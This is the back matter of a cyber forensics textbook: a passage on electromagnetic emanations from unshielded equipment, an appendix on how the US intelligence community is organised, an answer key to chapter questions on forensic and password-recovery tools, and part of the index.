As you know from your own observations, radio and/or television reception deteriorates (or in some cases, terminates) as we move from outside to inside an enclosure of some type (tunnels, elevators, shielded buildings, etc.). The same is true for other types of communication equipment, such as computers, monitors, various types of cabling, and other electronic equipment that exists on a computer communications network. If it is appropriately shielded you cannot get to it, but if it is not, it makes an excellent target for someone (such as a cyber forensic investigator \[CFI\]) who has the ability to extract information from electromagnetic fields (either covertly or openly). It is important to note that the tangential components of an electric field across an interface linking two media with no impressed magnetic current densities along the boundary of the interface are continuous. It is just as important to know that the tangential components of the magnetic field linking an interface between two media, neither of which is a perfect conductor, are continuous. In a wireless communication system, electromagnetic fields are utilized to carry data over to both short and long distances. To achieve this, energy must be coupled with electromagnetic fields. This conveyance of energy is realized even if we lack an intervening channel (think about this – from a cyber forensics tool perspective – extracting “hidden” data from energy fields with or without appropriate channels of conveyance).

# Appendix HThe intelligence community since 9/11

In the intelligence community, cyber forensics investigations and analysis are big business. There is an extreme focus in this area of expertise due to terrorist activities around the world. This appendix focuses on the significant reorganization of our intelligence community and the resources allocated to it.

According to the National Security Act of 1947 (This makes for excellent reading. Look it up.), there is a difference between Foreign Intelligence and Counterintelligence. Foreign Intelligence refers to “information relating to the capabilities, intentions, or activities of foreign governments or elements thereof, foreign organizations, or foreign persons.” Counterintelligence refers to “information gathered and activities conducted to protect against espionage, other intelligence activities, sabotage, or assassinations, conducted by or on behalf of foreign governments or elements thereof, foreign organizations, or foreign persons, or international terrorist activities.”

Within the intelligence community are what we call “The INTs”:

*   Human Intelligence sources (HUMINT) 
    *   Agents (controlled sources)
    *   Informants (willing sources)
*   Open-Source Intelligence sources (OSINT) 
    *   Print (such as newspapers)
    *   Broadcast (such as CNN \[Cable News Network\] and other news stations)
    *   Internet
*   Imagery Intelligence (IMINT) 
    *   Radar
    *   Multi-spectral
    *   Photographs (digital and regular film)
    *   Infrared
    *   Electro-optical
*   Signals Intelligence sources (SIGINT) 
    *   Communications intelligence — electronic signals (COMINT)
    *   Electronic intelligence (ELINT)
*   Instrumentation signals (FIS) 
    *   Computer network exploitation (SIGINT in “The Net”)
*   Measurement and Signatures (MASINT) 
    *   IR (infrared)
    *   Acoustic
    *   Magnetic
    *   Multi-spectral and hyper-spectral
    *   Radiation
    *   Spectrometry
    *   Radio frequency (RF)
*   Movement Intelligence (MOVINT) 
    *   Moving Target Indicator (MTI) radar
    *   Has day/night and all-weather capability
    *   Group formation (Is a military convoy on the move?)
    *   Reflection pattern (So we see jagged or smooth edges?)
    *   Separation between objects (tight or loose formations?)
    *   Speed (fast or slow)
    *   RF tags (cooperative radar return)
    *   Moving parts (trucks, rotating antennas, wheels)
    *   Acceleration (fast or sluggish)
    *   Direction (are the objects constrained by a road?)
    *   Radar cross section (small or large)

MOVINT is newer and can somewhat overlap other areas. Whether it continues to remain an “INT” on its own remains to be seen. It may eventually recede into the other “INTs.” Time will tell; however, it is an extremely interesting area of endeavor.

Our Intelligence Community (IC) is now organized as shown in [Figure H.l](#AppendixH.xhtml#fH.1). Note that in the figure, those organizations with names that are double-underlined fall under the Department of Defense (DOD). The others do not.

![Figure H.1 Intelligence Community (IC) organization.](images/figH.1.jpg)

**Figure H.1** Intelligence Community (IC) organization.

The Director of Central Intelligence (DCI) oversees IC policies and resources. The DCI has an enormous amount of responsibility but does not have sufficient authority to appropriately carry out his or her duties. Thus, the DCI ends up doing quite a bit of negotiating with other agencies.

The OSS (under Joint Chiefs of Staff \[JCOS\]) from World War II was the precursor to the Central Intelligence Agency (CIA). Twelve concerns/items shaped the IC:

*   The need for an effective national intelligence capability during peacetime (this was being determined at the end of World War II) 
    *   At that time, two major issues hanging over the head of the United States were: 
        *   – Pearl Harbor
        *   – The “Iron Curtain”
*   The IC must not be under military control 
    *   The president of the United States wanted an IC that was independent of the military.
*   The need to protect sources and methods
*   The need for a leader of the IC
*   An independent DCI who would be legally responsible for the protection of sources and methods
*   The need for mechanisms by which intelligence collectors could respond to the requirements of the entire government
*   The need for a joint attack on difficult problems
*   The expense of intelligence activities
*   Perceived need to ensure that IC activities did not conflict with the rights of US citizens. The following committees and Executive Orders (EO) from the president provided guidelines for this: 
    *   Senate “Church Committee” in 1975 and 1976
    *   House “Pike” committee
    *   EO 11905 from President Ford in 1976
    *   EO 12036 (Carter in 1978) and EO 12333 (Reagan in 1981)
    *   DoD Directive 5240.1, DoD Intelligence Activities (1988)
*   Desire to prevent another major “spy turned traitor” case 
    *   The Walker case in 1985 and 1986
*   John Walker is now serving life in prison (Marion, IL)
*   Major damage to the United States in relation to Soviet spy activities
*   Of course the United States still ended up with two other major cases 
    *   Ames
    *   Hansen
*   Studies of vulnerabilities
*   Additional senior level oversight desired 
    *   NSC Committee
    *   National Counterintelligence Executive (NICX)

Congressional documents that do much to cover the abovementioned activities are as follows. These are an excellent read. If you contact the House Intelligence Committee, you can obtain all of the following documents free of charge (your tax dollars at work):

*   National Security Act of 1947 (Amended)
*   Senate Resolution 400 
    *   Senate Select Committee on Intelligence
*   House Resolution 658 
    *   Charter of the House Permanent Select Committee on Intelligence
*   Intelligence Authorization Acts (Annual)
*   Defense Authorization Acts (Annual)
*   Defense Appropriations Acts (Annual)

Similarly, White House documents exist that cover the abovementioned activities as well:

*   NSCIDs
*   Nixon memo 
    *   Reorganization of the US Intelligence Community (November 5, 1971): It is interesting to note that this document was never followed up on due to the occurrence of Watergate.
*   EO 11905 from President Ford in 1976
*   EO 12036 (Carter in 1978) and EO 12333 (Reagan in 1981)

IC “core capabilities” are as follows:

*   Intelligence collection
*   All-source/multidisciplinary analysis
*   On-site inspection 
    *   Big boost for the IC
*   Counterintelligence
*   Covert action
*   Operational activities conducted by the CIA legally

IC “sustaining capabilities” are as follows:

*   Imagery exploitation
*   Production processing
*   Collection support
*   Tasking arrangements
*   Investigations
*   Cryptanalysis
*   Language processing

IC “supporting capabilities” are as follows:

*   Research and development
*   Facilities
*   Security
*   Communications
*   Logistics
*   Education and training
*   Management

The “intelligence missions” of the IC can really be broken down into four main areas. Note that the President’s Daily Brief (PDB) falls in here also:

*   Counterintelligence
*   Support to law enforcement (all the more since 9/11/01) 
    *   Counter narcotics
    *   Illegal technology transfer
    *   Counterespionage
*   Economic espionage against US businesses 
    *   Counterterrorism
    *   Countering international criminal organizations and their activities such as money laundering
*   Support to military operations (SMO) 
    *   Combat operations
    *   Contingency operations (other than war)
    *   Overseas presence
    *   Nuclear and other weapons of mass destruction (WOMD)
    *   Weapons systems acquisition
    *   Force planning and modernization
*   Support to policymakers 
    *   Environmental issues
    *   Economic and trade policy
    *   Diplomacy 
        *   – Negotiations
        *   – Policy formulation
    *   Support to diplomatic operations
    *   Defense policy (not SMO)
    *   Counterproliferation
    *   Civil and other natural disasters
*   Satellite mapping to help Federal Emergency Management Agency (FEMA) handle a natural disaster

The NSC principles are what guide intelligence priorities; these are reviewed every six months. The three most important questions to the IC are:

*   Who are the really major players?
*   What *can* these “major players” do? 
    *   To US security interests
    *   To one another
*   What do these “major players” *intend* to do? 
    *   To damage US interests
    *   To one another

Let us focus on the DCI for a minute. What are this individual’s roles and responsibilities? The DCFs functions are specified in the 1947 National Security Act and are as follows:

*   Manages the CIA
*   Protects sources and methods
*   Provides guidance on future needs and capabilities
*   Advises the president and the National Security Council
*   Develops IC policies
*   Establishes requirements and priorities for collection activities

The National Intelligence Council, which reports to the DCI, has the following responsibilities:

*   Senior advisory group to the DCI on substantive matters 
    *   Sense of the Community Memoranda
    *   National Intelligence Estimates (NIE)
*   Performs evaluations
*   National Intelligence Officers (NIO)
*   Interagency group
*   National Intelligence Analysis and Production Board

The functions of the CIA include:

*   All-source analysis
*   Covert action
*   Foreign intelligence collection
*   Counterintelligence

To perform these functions, the CIA must have the following:

*   Planning
*   Administration
*   Overseas stations and bases
*   Research and development

Three major items developed/implemented by the CIA are:

*   U2 spy plane
*   SR71 aircraft
*   MASINT

The DOD is the largest producer and consumer of intelligence. For the DOD, the importance of intelligence falls under these three items:

*   Operations support
*   Weapons development
*   Military posture

The Defense Intelligence Agency (DIA) was created in 1961 and has the following functions:

*   Manages MASINT for the IC
*   Collection management
*   Coordinates all military intelligence activities
*   All-source analysis 
    *   Defense Intelligence Analysis Center (DIAC)
*   Supports military departments, commands, and others in DOD
*   Manages the Defense HUMINT System

The National Reconnaissance Office (NRO) was formed in 1961 and is a joint DOD/CIA activity. The NRO develops, builds, launches, and operates reconnaissance satellites used for imagery and signal intelligence. The Director of the NRO is the Under Secretary of the Air Force (this is the number two person in the Air Force).

The National Security Agency (NSA) has both an Intelligence branch and an Information Assurance branch (non-Intel). The main functions of the NSA are as follows:

*   Code breaking
*   Code making
*   SIGINT 
    *   Collection management
    *   Data acquisition (also known as “collection”)
    *   Analysis and production 
        *   – Cryptanalysis
    *   Reporting
*   Communications security
*   Computer security and network defense
*   Systems security

Responsibility of NSA is for classified networks only. Nonetheless, NSA provides a number of documents to the commercial industry that are considered “Best Practices” from an information security perspective and that a large number of commercial organizations follow. Note that other networks’ security falls under NIST.

National Imagery and Mapping Agency (NIMA) has been given a new name that is more in line with its mission: National Geospatial-Intelligence Agency (NGA). NGA’s mission is as follows:

*   Analyze images obtained from satellites
*   Manage and task imagery collection 
    *   Provide “advisory” tasking to theater and tactical imagery collection systems
    *   Act as national collection agents (airborne and satellite)
    *   Obtain imagery from commercial sources
*   Provide primary and secondary imagery, imagery products, and geospatial information to end users

Other organizations involved in the intelligence community are as follows:

*   Department of State 
    *   Bureau of Intelligence and Research (INR) 
        *   – Supports the Secretary of State and senior officials with very up-to-date intelligence summaries and analyses
        *   – Senior Intel community people work here
        *   – The analytical structure of the OSS was moved here after World War II
*   Department of Energy (DoE) 
    *   Focus is on nuclear intelligence 
        *   – Nuclear power
    *   Foreign nuclear weapons capabilities assessments
    *   Offices for Intelligence and Counterintelligence are separate – The “Office of Counterintelligence” is the new kid on the block relatively speaking
    *   Three major laboratories under DoE control 
        *   – Los Alamos
        *   – Lawrence Livermore
        *   – Sandia Labs
*   Department of the Treasury 
    *   Federal Law Enforcement Training Center (FLETC)
    *   Bureau of Alcohol, Tobacco and Firearms (BATF)
    *   US Secret Service
    *   Financial Crimes Enforcement Network (FINCEN)
    *   US Customs Service
*   National Counterintelligence Executive (NICX)
*   Federal Bureau of Investigation (FBI)
*   CIA
*   Military Services and Defense Security Service (DSS): Focus is on: 
    *   Defense contractors
    *   Various DoD organizations
*   Department of Homeland Security (DHS) 
    *   Various organizations fall under (or work closely with) DHS but the newest one is Terrorist Threat Integration Center (TTIC). TTIC is an interagency organization.
*   Department of Transportation 
    *   Office of Intelligence and Security
    *   Federal Aviation Administration (FAA)
    *   Transportation Security Agency (TSA)
*   Department of Commerce 
    *   Enforces export control laws
*   Drug Enforcement Administration (DEA)
*   El Paso Intelligence Center (EPIC)

Note that of all the intelligence/counterintelligence agencies, only one is an independent agency that is answerable only to the president of the United States – the CIA.

# Appendix IAnswers to chapter questions

## Chapter 1: The initial contact

*   *Question 1:* List five different case types.
*   *Answer:* Answers will vary. Five possible case types could be: 
    *   Sabotage
    *   Trade secret theft
    *   Military weapons systems maliciously altered
    *   Stolen corporate marketing plans
    *   Murder
*   *Question 2:* List eight questions you should have answers to before you arrive at the client site.
*   *Answer:* Answers will vary. Eight possible questions are as follows: 
    *   Do you have an Intrusion Detection System (IDS) in place?
    *   Who first noticed the incident?
    *   Are there security policy/procedures in place?
    *   Why do you think there was a break-in?
    *   Do the compromised systems have Small Computer Systems Interface (SCSI) or parallel ports (or both)? If SCSI, which type?
    *   What operating systems are utilized at your facility?
    *   How old is the equipment?
    *   Does the crime scene area forbid or preclude the use of electronic communication devices such as cellular phones, pagers, digital recorders, etc.?
*   *Question 3:* Can the order in which you ask questions be important?
*   *Answer:* Yes
*   *Question 4:* What are the two major reasons for putting together a list of pertinent questions and obtaining answers?
*   *Answer:* To obtain the knowledge. To begin the thinking process for both you and your client.

## Chapter 2: Client site arrival

*   *Question 1:* What should you be doing as you travel to the client site?
*   *Answer:* You could be doing several things, depending on your situation: 
    *   Reviewing the information that you have already obtained from the client.
    *   Reviewing network topology diagrams.
    *   Discussing various ideas/approaches with your teammates if you are part of a team.
*   *Question 2:* If you are part of a team, remember that there is only \_\_\_\_\_\_\_\_\_\_ person in charge. Everyone on the team must completely support the \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_ at the client site.
*   *Answer:* one; team leader
*   *Question 3:* What is the first thing you should do when you arrive at the client site?
*   *Answer:* Prebriefing
*   *Question 4:* List three questions that you should ask at a prebriefing.
*   *Answer:* Questions vary depending on the case you are working but three possible questions are: 
    *   Who was the last person on the system?
    *   Does this individual normally work these hours?
    *   Does your security policy prohibit personnel from sharing use-rids and/or passwords?

## Chapter 3: Evidence collection procedures

*   *Question 1:* State Locard’s Exchange Principle.
*   *Answer:* Anyone, or anything, entering a crime scene takes something of the crime scene with them. They also leave behind something of themselves when they depart.
*   *Question 2:* To what website should you go to review computer search and seizure guidelines that are acceptable in a court of law?
*   *Answer:* [http://www.usdoj.gov/criminal/cybercrime](http://www.usdoj.gov)
*   *Question 3:* List the six investigative techniques, in order, used by the FBI.
*   *Answer:* The FBI investigative steps are as follows: 
    1.  a. Check records, logs, and documentation
    2.  b. Interview personnel
    3.  c. Conduct surveillance
    4.  d. Prepare a search warrant
    5.  e. Search the suspect’s premises if necessary
    6.  f. Seize evidence if necessary
*   *Question 4:* What tools could be used to obtain a bitstream backup of a computer hard drive?
*   *Answer:* SafeBack, DD (Unix), Encase

## Chapter 4: Evidence collection and analysis tools

*   *Question 1:* What tool fits on a diskette and allows you to quickly obtain slack space from a computer?
*   *Answer:* GetSlack
*   *Question 2:* What tool would you use to encrypt and decrypt files?
*   *Answer:* Mcrypt
*   *Question 3:* What tool securely removes residual data from hard drives?
*   *Answer:* M-Sweep
*   *Question 4:* What tool has the potential to identify terrorist activities before they take place (such as bomb making, pornography, hate crimes, etc.)?
*   *Answer:* Net Threat Analyzer

## Chapter 5: AccessData’s forensic tool kit

*   *Question 1:* What function does AccessData’s FTK excel at?
*   *Answer:* E-mail analysis
*   *Question 2:* How many file formats can you view using AccessData’s FTK?
*   *Answer:* Over 270 different formats
*   *Question 3*: Is AccessData’s FTK compatible with their “Password Recovery Toolkit” and “Distributed Network Attack”?
*   *Answer:* Yes
*   *Question 4:* Which types of e-mail and Zip files can be analyzed using AccessData’s FTK?
*   *Answer:* AOL, Outlook, Outlook Express, Netscape, Yahoo, Earth-Link, Eudora, Hotmail, MSN, PKZIP, WinZip, WinRAR, GZIP, TAR

## Chapter 6: Guidance Software’s EnCase

*   *Question 1:* What platforms and file systems does EnCase Forensic Edition support?
*   *Answer:* 
    *   Platforms: Windows 95/98/NT/2000/XP/2003 Server, DOS, Linux, UNIX, BSD, PALM OS, Macintosh
    *   File Systems: NTFS, FAT 12/16/32, EXT 2/3, CDFS, JOLIET, UFS, FFS, Reiser, UDF, ISO9660, HFS, HFST
*   *Question 2:* What is the purpose of EnScript?
*   *Answer: A* macro language for automating EnCase functions
*   *Question 3:* Can you build custom scripts for special investigative needs and to automate tasks?
*   *Answer:* Yes
*   *Question 4:* Has EnCase been NIST verified?
*   *Answer:* Yes. See [http://www.nist.gov/director/states/ca/fy03\_ca\_10.htm](http://www.nist.gov).

## Chapter 7: Hook investigator

*   *Question 1:* What Hash Databases does ILook Investigator support?
*   *Answer:* Hashkeeper and NIST NSRL ([http://www.ilook-foren-sics.org/Versions](http://www.ilook-foren-sics.org). html)
*   *Question 2:* Who is the author of ILook?
*   *Answer:* Elliot Spencer, who heads up a forensic unit at a United Kingdom law enforcement agency
*   *Question 3:* What prominent US government agency makes significant use of ILook Investigator?
*   *Answer:* The Criminal Investigation Division of the Internal Revenue Service (IRS)
*   *Question 4:* Does ILook Investigator make extensive use of color coding to enhance investigative efficiency?
*   *Answer:* Yes

## Chapter 8: Password recovery

*   *Question 1:* Who makes excellent password recovery tools?
*   *Answer:* AccessData ([http://www.accessdata.com](http://www.accessdata.com))
*   *Question 2:* What individual Password Breaker Modules does AccessData have available?
*   *Answer:* From the AccessData website we obtain the following information:  
    AccessData has a wide variety of individual password breaking modules that can help you recover lost passwords for almost every product in the industry.  
    Individual Password Breaker Modules: 
    *   MS Access
    *   ACT!
    *   Ami Pro
    *   Approach
    *   ARJ
    *   Ascend
    *   Backup
    *   BestCrypt
    *   Bullet Proof FTP
    *   Cute FTP
    *   DataPerfect
    *   dBase
    *   Encrypt Magic Fldr
    *   Excel
    *   FoxBase
    *   File Maker Pro
    *   Lotus 1-2-3 Mail (MS)
    *   MS Money
    *   MYOB
    *   My Personal check Writer
    *   Norton Secret Stuff
    *   Organizer
    *   MS Outlook
    *   Palm
    *   Paradox
    *   PGP Disk File 4.0
    *   PGP Secret Key Ring
    *   Pro Write
    *   Project (MS)
    *   WinZip & Generic Zippers
    *   Q&A
    *   Quattro Pro QuickBooks
    *   Quicken
    *   WinRAR
    *   Scheduled
    *   Symphony
    *   VersaCheck
    *   MS Word
    *   WordPerfect
    *   Word Pro
    *   Adobe PDF
    *   Win95/Win98 PWL Files
    *   IE Content Advisor
    *   WE\_FTP
    *   Netscape Mail
    *   Source Safe
    *   PC-Encrypt
*   *Question 3:* Does AccessData have utilities that will bypass network administrator passwords?
*   *Answer:* Yes, for Windows NT and Novell systems.
*   *Question 4:* What can you do if the Password Recovery Toolkit says it cannot obtain a password you desire?
*   *Answer:* Use AccessData’s “Distributed Network Attack” (DNA) product. This product can be used to harness the processing power of multiple machines to break passwords.

# Index

*   A
*   Acceleration, [202](#c12.xhtml#p202), [304](#AppendixH.xhtml#p304)
*   ACCESSDATA, [10](#c3.xhtml#p10), [19](#c3.xhtml#p19), [69](#c5.xhtml#p69), [81](#c5.xhtml#p81)–[83](#c5.xhtml#p83), [85](#c6.xhtml#p85), [93](#c6.xhtml#p93)–[94](#c6.xhtml#p94), [97](#c6.xhtml#p97)–[99](#c6.xhtml#p99), [102](#c6.xhtml#p102), [113](#c7.xhtml#p113), [129](#c8.xhtml#p129), [132](#c8.xhtml#p132), [237](#c15.xhtml#p237), [251](#c15.xhtml#p251), [315](#AppendixI.xhtml#p315)–[316](#AppendixI.xhtml#p316), [318](#AppendixI.xhtml#p318)
*   Accident, [22](#c3.xhtml#p22), [203](#c12.xhtml#p203)
*   Accountants, [41](#c4.xhtml#p41), [221](#c13.xhtml#p221)
*   Accuracy, [206](#c12.xhtml#p206), [218](#c13.xhtml#p218)
*   AccuTrack, [208](#c12.xhtml#p208)
*   Accuweather, [249](#c15.xhtml#p249)
*   Achilles, [205](#c12.xhtml#p205)
*   ACL, [144](#c9.xhtml#p144), [178](#c11.xhtml#p178)
*   ACP, [185](#c11.xhtml#p185), [209](#c12.xhtml#p209)
*   Acquisition, [98](#c6.xhtml#p98), [101](#c6.xhtml#p101)–[102](#c6.xhtml#p102), [104](#c6.xhtml#p104)–[106](#c6.xhtml#p106), [199](#c12.xhtml#p199), [308](#AppendixH.xhtml#p308), [310](#AppendixH.xhtml#p310)
*   Acrobat, [118](#c7.xhtml#p118), [174](#c11.xhtml#p174)
*   ActiveX, [294](#AppendixE.xhtml#p294)–[295](#AppendixE.xhtml#p295)
*   Actkey, [293](#AppendixE.xhtml#p293)
*   Actor, [11](#c3.xhtml#p11), [13](#c3.xhtml#p13), [15](#c3.xhtml#p15), [18](#c3.xhtml#p18), [200](#c12.xhtml#p200), [205](#c12.xhtml#p205), [207](#c12.xhtml#p207), [237](#c15.xhtml#p237), [244](#c15.xhtml#p244)–[245](#c15.xhtml#p245), [254](#c15.xhtml#p254)
*   ACULOG, [145](#c9.xhtml#p145)
*   Adaptec, [23](#c3.xhtml#p23)–[25](#c3.xhtml#p25)
*   Adapter, [22](#c3.xhtml#p22), [24](#c3.xhtml#p24)–[25](#c3.xhtml#p25), [103](#c6.xhtml#p103), [174](#c11.xhtml#p174)
*   Adblockers, [246](#c15.xhtml#p246)
*   Addr, [186](#c11.xhtml#p186), [188](#c11.xhtml#p188), [191](#c11.xhtml#p191)–[192](#c11.xhtml#p192)
*   Address, [17](#c3.xhtml#p17)
*   ADFTK, [69](#c5.xhtml#p69), [71](#c5.xhtml#p71), [77](#c5.xhtml#p77), [79](#c5.xhtml#p79)
*   ADINSTALL, [57](#c4.xhtml#p57)
*   Adleman, [265](#AppendixA.xhtml#p265)
*   Admin, [16](#c3.xhtml#p16), [19](#c3.xhtml#p19), [168](#c11.xhtml#p168), [272](#AppendixC.xhtml#p272)–[273](#AppendixC.xhtml#p273), [293](#AppendixE.xhtml#p293)–[294](#AppendixE.xhtml#p294)
*   Administrator, [2](#c1.xhtml#p2), [5](#c2.xhtml#p5), [132](#c8.xhtml#p132)–[133](#c9.xhtml#p133), [143](#c9.xhtml#p143)–[144](#c9.xhtml#p144), [149](#c9.xhtml#p149), [157](#c11.xhtml#p157)–[158](#c11.xhtml#p158), [167](#c11.xhtml#p167)–[168](#c11.xhtml#p168), [170](#c11.xhtml#p170), [172](#c11.xhtml#p172), [175](#c11.xhtml#p175), [177](#c11.xhtml#p177)–[178](#c11.xhtml#p178), [194](#c11.xhtml#p194), [196](#c11.xhtml#p196), [248](#c15.xhtml#p248), [318](#AppendixI.xhtml#p318)
*   ADMTEK, [103](#c6.xhtml#p103)
*   Adobe, [115](#c7.xhtml#p115), [118](#c7.xhtml#p118)–[119](#c7.xhtml#p119), [174](#c11.xhtml#p174), [317](#AppendixI.xhtml#p317)
*   ADR, [149](#c9.xhtml#p149)
*   Advisor, [239](#c15.xhtml#p239), [317](#AppendixI.xhtml#p317)
*   Adware, [14](#c3.xhtml#p14)
*   AES, [251](#c15.xhtml#p251)
*   Agency, [44](#c4.xhtml#p44), [71](#c5.xhtml#p71), [79](#c5.xhtml#p79), [113](#c7.xhtml#p113), [127](#c7.xhtml#p127), [157](#c11.xhtml#p157), [166](#c11.xhtml#p166), [214](#c12.xhtml#p214), [224](#c13.xhtml#p224), [264](#AppendixA.xhtml#p264), [304](#AppendixH.xhtml#p304), [308](#AppendixH.xhtml#p308)–[312](#AppendixH.xhtml#p312), [316](#AppendixI.xhtml#p316)
*   AI, [217](#c13.xhtml#p217)–[219](#c13.xhtml#p219)
*   Airbus, [210](#c12.xhtml#p210)
*   Aircraft, [5](#c2.xhtml#p5), [309](#AppendixH.xhtml#p309)
*   Airline, [159](#c11.xhtml#p159), [173](#c11.xhtml#p173)
*   Airplane, [167](#c11.xhtml#p167), [172](#c11.xhtml#p172)–[173](#c11.xhtml#p173), [175](#c11.xhtml#p175), [180](#c11.xhtml#p180)
*   Airport, [167](#c11.xhtml#p167), [172](#c11.xhtml#p172), [225](#c13.xhtml#p225), [252](#c15.xhtml#p252)
*   Airstrip, [159](#c11.xhtml#p159)
*   AIX, [275](#AppendixD.xhtml#p275)
*   AJWNAFC, [71](#c5.xhtml#p71)
*   Alamos, [311](#AppendixH.xhtml#p311)
*   Algorithm, [99](#c6.xhtml#p99), [138](#c9.xhtml#p138), [226](#c13.xhtml#p226), [238](#c15.xhtml#p238), [263](#AppendixA.xhtml#p263)
*   Alias, [289](#AppendixD.xhtml#p289)
*   Alibis, [1](#c1.xhtml#p1)
*   Alstom, [199](#c12.xhtml#p199), [246](#c15.xhtml#p246)
*   AltaVista, [271](#AppendixC.xhtml#p271)
*   Amass, [250](#c15.xhtml#p250)
*   Amazon, [225](#c13.xhtml#p225), [248](#c15.xhtml#p248)
*   AMD, [103](#c6.xhtml#p103)
*   Amendment, [9](#c3.xhtml#p9), [27](#c3.xhtml#p27)
*   Ames, [306](#AppendixH.xhtml#p306)
*   AMI, [115](#c7.xhtml#p115), [118](#c7.xhtml#p118), [130](#c8.xhtml#p130), [317](#AppendixI.xhtml#p317)
*   Amplitude, [207](#c12.xhtml#p207)
*   ANADISK, [56](#c4.xhtml#p56)–[57](#c4.xhtml#p57), [139](#c9.xhtml#p139)
*   Analog, [206](#c12.xhtml#p206), [264](#AppendixA.xhtml#p264)
*   ANALYSIS, [10](#c3.xhtml#p10)–[11](#c3.xhtml#p11), [13](#c3.xhtml#p13), [16](#c3.xhtml#p16)–[17](#c3.xhtml#p17), [26](#c3.xhtml#p26)–[27](#c3.xhtml#p27), [29](#c4.xhtml#p29), [31](#c4.xhtml#p31)–[33](#c4.xhtml#p33), [35](#c4.xhtml#p35), [37](#c4.xhtml#p37)–[39](#c4.xhtml#p39), [41](#c4.xhtml#p41), [43](#c4.xhtml#p43), [45](#c4.xhtml#p45), [47](#c4.xhtml#p47), [49](#c4.xhtml#p49), [51](#c4.xhtml#p51), [53](#c4.xhtml#p53), [55](#c4.xhtml#p55), [57](#c4.xhtml#p57), [59](#c4.xhtml#p59), [61](#c4.xhtml#p61), [63](#c4.xhtml#p63), [65](#c4.xhtml#p65)–[67](#c4.xhtml#p67), [76](#c5.xhtml#p76), [85](#c6.xhtml#p85), [94](#c6.xhtml#p94), [97](#c6.xhtml#p97)–[102](#c6.xhtml#p102), [117](#c7.xhtml#p117), [134](#c9.xhtml#p134), [137](#c9.xhtml#p137), [140](#c9.xhtml#p140), [144](#c9.xhtml#p144), [173](#c11.xhtml#p173), [176](#c11.xhtml#p176), [179](#c11.xhtml#p179)–[182](#c11.xhtml#p182), [195](#c11.xhtml#p195), [206](#c12.xhtml#p206), [208](#c12.xhtml#p208), [226](#c13.xhtml#p226)–[227](#c13.xhtml#p227), [237](#c15.xhtml#p237)–[238](#c15.xhtml#p238), [240](#c15.xhtml#p240)–[242](#c15.xhtml#p242), [249](#c15.xhtml#p249), [253](#c15.xhtml#p253)–[256](#c15.xhtml#p256), [259](#c15.xhtml#p259), [264](#AppendixA.xhtml#p264)–[265](#AppendixA.xhtml#p265), [301](#AppendixG.xhtml#p301)–[303](#AppendixH.xhtml#p303), [307](#AppendixH.xhtml#p307), [309](#AppendixH.xhtml#p309)–[310](#AppendixH.xhtml#p310), [315](#AppendixI.xhtml#p315)
*   Analyst, [97](#c6.xhtml#p97)–[102](#c6.xhtml#p102), [104](#c6.xhtml#p104), [111](#c6.xhtml#p111), [154](#c10.xhtml#p154), [157](#c11.xhtml#p157), [174](#c11.xhtml#p174), [179](#c11.xhtml#p179), [200](#c12.xhtml#p200), [237](#c15.xhtml#p237)
*   Analytics, [207](#c12.xhtml#p207)–[208](#c12.xhtml#p208), [254](#c15.xhtml#p254)
*   AnalyzeMe, [56](#c4.xhtml#p56)
*   Analyzer, [55](#c4.xhtml#p55), [166](#c11.xhtml#p166), [255](#c15.xhtml#p255), [259](#c15.xhtml#p259), [315](#AppendixI.xhtml#p315)
*   Annual Reports, [252](#c15.xhtml#p252)
*   Anomaly, [226](#c13.xhtml#p226), [301](#AppendixG.xhtml#p301)
*   Anonymity, [138](#c9.xhtml#p138), [248](#c15.xhtml#p248), [252](#c15.xhtml#p252)
*   ANSI, [115](#c7.xhtml#p115), [118](#c7.xhtml#p118)
*   Antenna, [224](#c13.xhtml#p224), [301](#AppendixG.xhtml#p301), [304](#AppendixH.xhtml#p304)
*   Antigen, [267](#AppendixB.xhtml#p267)
*   Antionline, [155](#c10.xhtml#p155), [183](#c11.xhtml#p183)
*   Antistatic, [174](#c11.xhtml#p174)
*   Antivirus, [13](#c3.xhtml#p13)–[14](#c3.xhtml#p14), [67](#c4.xhtml#p67), [173](#c11.xhtml#p173)
*   API, [239](#c15.xhtml#p239), [248](#c15.xhtml#p248), [254](#c15.xhtml#p254), [256](#c15.xhtml#p256)–[257](#c15.xhtml#p257)
*   APNIC, [147](#c9.xhtml#p147)
*   Appitrack, [205](#c12.xhtml#p205)
*   Appliance, [208](#c12.xhtml#p208), [301](#AppendixG.xhtml#p301)
*   APTA, [206](#c12.xhtml#p206)
*   Arabic, [159](#c11.xhtml#p159)
*   ARAMIS, [211](#c12.xhtml#p211)
*   Arbor, [42](#c4.xhtml#p42), [45](#c4.xhtml#p45)
*   Architecture, [2](#c1.xhtml#p2), [7](#c2.xhtml#p7), [12](#c3.xhtml#p12), [71](#c5.xhtml#p71), [73](#c5.xhtml#p73), [154](#c10.xhtml#p154), [169](#c11.xhtml#p169), [212](#c12.xhtml#p212), [294](#AppendixE.xhtml#p294)
*   ARCNET, [261](#AppendixA.xhtml#p261)
*   AREMA, [210](#c12.xhtml#p210)
*   ARIN, [147](#c9.xhtml#p147)
*   ARJ, [317](#AppendixI.xhtml#p317)
*   Armor, [13](#c3.xhtml#p13)
*   Armory, [240](#c15.xhtml#p240)
*   ARP, [140](#c9.xhtml#p140), [261](#AppendixA.xhtml#p261), [291](#AppendixE.xhtml#p291)–[293](#AppendixE.xhtml#p293)
*   Arrival, [3](#c1.xhtml#p3), [5](#c2.xhtml#p5), [7](#c2.xhtml#p7), [29](#c4.xhtml#p29), [175](#c11.xhtml#p175), [314](#AppendixI.xhtml#p314)
*   Arsenal, [83](#c5.xhtml#p83)
*   Artifact, [66](#c4.xhtml#p66)–[67](#c4.xhtml#p67)
*   Artilects, [218](#c13.xhtml#p218)
*   ASCII, [17](#c3.xhtml#p17), [19](#c3.xhtml#p19), [35](#c4.xhtml#p35)–[36](#c4.xhtml#p36), [38](#c4.xhtml#p38)–[40](#c4.xhtml#p40), [45](#c4.xhtml#p45), [57](#c4.xhtml#p57), [61](#c4.xhtml#p61)–[62](#c4.xhtml#p62), [65](#c4.xhtml#p65), [87](#c6.xhtml#p87), [89](#c6.xhtml#p89), [91](#c6.xhtml#p91), [115](#c7.xhtml#p115), [118](#c7.xhtml#p118), [124](#c7.xhtml#p124), [139](#c9.xhtml#p139), [144](#c9.xhtml#p144), [164](#c11.xhtml#p164), [182](#c11.xhtml#p182)
*   ASP, [248](#c15.xhtml#p248)
*   ASPI, [25](#c3.xhtml#p25), [30](#c4.xhtml#p30)
